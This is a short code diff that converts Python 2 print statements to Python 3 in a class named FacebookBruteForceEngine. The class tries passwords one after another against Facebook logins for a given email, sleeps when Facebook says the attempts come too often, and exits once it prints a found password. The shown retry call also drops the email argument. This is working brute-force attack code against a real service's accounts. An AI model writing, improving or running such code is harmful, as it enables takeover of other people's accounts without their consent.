@@ -40,16 +40,16 @@ class FacebookBruteForceEngine(object):
         return 'too often' in data
 
     def try_password(self, email, password):
-        print 'Trying %s' % password
+        print ('Trying %s' % password)
         data = self.send_login(email, password)
 
         if self.is_too_often(data):
-            print 'Facebook says we\'re trying too often. Waiting 30 seconds.'
+            print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
             sleep(30)
             self.try_password(password)
 
         if self.is_logged_in(data):
-            print 'Password found: %s' % password  
+            print ('Password found: %s' % password )
             sys.exit()
 
     def run(self, email, password_generator):
